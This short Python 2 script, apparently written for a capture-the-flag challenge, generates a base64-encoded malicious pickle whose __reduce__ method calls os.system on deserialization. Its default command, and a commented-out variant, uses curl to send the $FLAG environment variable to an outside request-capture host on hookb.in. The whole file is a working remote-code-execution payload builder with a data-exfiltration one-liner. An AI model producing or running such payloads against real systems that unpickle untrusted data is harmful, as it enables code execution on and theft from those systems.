import cPickle
import sys
import base64


# DEFAULT_COMMAND = "curl -X POST -H \"Content-Type: application/json\" -d '{\"name\": $(echo $FLAG)}' https://hookb.in/LgPgx0wglquWkkrayO3n"
DEFAULT_COMMAND = "curl -X GET https://hookb.in/LgPgx0wglquWkkrayO3n?$(echo $FLAG)"

COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print(base64.b64encode(cPickle.dumps(PickleRce())))